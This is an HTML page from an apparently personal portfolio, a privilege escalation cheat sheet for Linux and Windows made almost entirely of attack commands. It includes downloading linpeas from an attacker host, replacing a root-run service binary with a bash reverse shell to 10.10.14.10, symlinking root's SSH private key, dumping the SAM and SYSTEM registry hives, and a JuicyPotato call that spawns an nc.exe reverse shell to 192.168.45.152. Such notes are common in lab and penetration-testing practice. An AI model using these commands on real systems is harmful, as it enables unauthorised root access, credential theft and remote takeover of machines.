<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <meta name="description" content="Privilege escalation cheat sheet" />
  <title>Privilege Escalation Cheat Sheet</title>
  <link rel="stylesheet" href="/assets/css/writeups.css">
</head>
<body class="cheatsheet">
  <!-- Navbar moved inside body, cheatsheet class added -->
  <nav class="cheatsheet-navbar">
    <div class="nav-left">
      <a href="index.html" class="nav-logo">Portfolio</a>
    </div>
    <ul class="nav-right">
      <li><a href="../writeups/">Writeups</a></li>
      <li><a href="cheatsheet.html" class="active">Cheatsheets</a></li>
    </ul>
  </nav>

  <header class="site-header">
    <div class="wrap">
      <h1>Privilege Escalation</h1>
      <nav class="main-nav">
        <ul>
          <li><a href="index.html">Home</a></li>
          <li><a href="recon.html">Recon</a></li>
          <li><a href="windows.html">Windows</a></li>
          <li><a href="web.html">Web</a></li>
          <li><a href="privesc.html" class="active">PrivEsc</a></li>
        </ul>
      </nav>
    </div>
  </header>

  <main class="cheatsheet-content">
    <article>

      <h2>Linux - Quick checks</h2>
      <div class="code"><pre><code>id</code></pre></div>
      <div class="code"><pre><code>cat /etc/passwd</code></pre></div>
      <div class="code"><pre><code>uname -a</code></pre></div>

      <h2>Find SUID</h2>
      <div class="code"><pre><code>find / -perm -4000 2>/dev/null</code></pre></div>

      <h2>Find capabilities</h2>
      <div class="code"><pre><code>/usr/sbin/getcap -r / 2>/dev/null</code></pre></div>

      <h2>Linpeas</h2>
      <div class="code"><pre><code>wget http://10.10.16.5/linpeas.sh</code></pre></div>

      <h2>Service binary replacement (example)</h2>
      <p>If a root runnable script restarts a binary you own or can replace:</p>
      <div class="code"><pre><code>mv /usr/local/nagios/bin/nagios /usr/local/nagios/bin/nagios~</code></pre></div>
      <div class="code"><pre><code>echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.10/9001 0>&1' &gt; /usr/local/nagios/bin/nagios; chmod +x /usr/local/nagios/bin/nagios</code></pre></div>

      <h2>Symlink trick</h2>
      <div class="code"><pre><code>ln -s /root/.ssh/id_rsa cmdsubsys.log</code></pre></div>

      <h2>Windows - Local PrivEsc checks</h2>
      <div class="code"><pre><code>whoami /priv</code></pre></div>
      <div class="code"><pre><code>whoami /groups</code></pre></div>

      <h2>SeBackupPrivilege - dump registry</h2>
      <div class="code"><pre><code>reg save HKLM\SAM SAM</code></pre></div>
      <div class="code"><pre><code>reg save HKLM\SYSTEM SYSTEM</code></pre></div>

      <h2>Token abuse & JuicyPotato / GodPotato</h2>
      <div class="code"><pre><code>.\Juicy.Potato.x86.exe -l 1360 -p c:\windows\system32\cmd.exe -a "/c c:\users\Public\nc.exe -e cmd.exe 192.168.45.152 242"</code></pre></div>

      <h2>Misc notes</h2>
      <ul>
        <li>Always read `sudo -l` and cron entries carefully.</li>
        <li>GTFOBins is a great reference for abusing SUIDs and capabilities.</li>
        <li>Keep private keys and TGT/ccache files well organized and deleted after use if needed.</li>
      </ul>

    </article>
  </main>

  <footer class="site-footer">
    <div class="wrap">
      <p>Â© Rachel Murphy 2025</p>
      <p><a href="index.html">Back</a></p>
    </div>
  </footer>

  <script src="/assets/css/js/script.js"></script>
</body>
</html>
